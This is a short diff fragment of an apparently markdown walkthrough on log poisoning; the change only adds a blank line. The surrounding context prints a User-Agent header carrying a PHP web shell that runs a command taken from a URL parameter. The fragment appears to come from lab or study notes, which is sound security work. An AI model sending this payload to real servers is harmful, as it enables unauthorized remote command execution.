@@ -25,6 +25,7 @@ This indicates that the log entry contains the user agent.
 ```bash
 User-Agent: Mozilla/5.0 <?php echo system($_GET[‘cmd’]); ?>
 ```
+
 ![[../../Assets/images/Pasted image 20260506003910.png]]
 
 3. Send
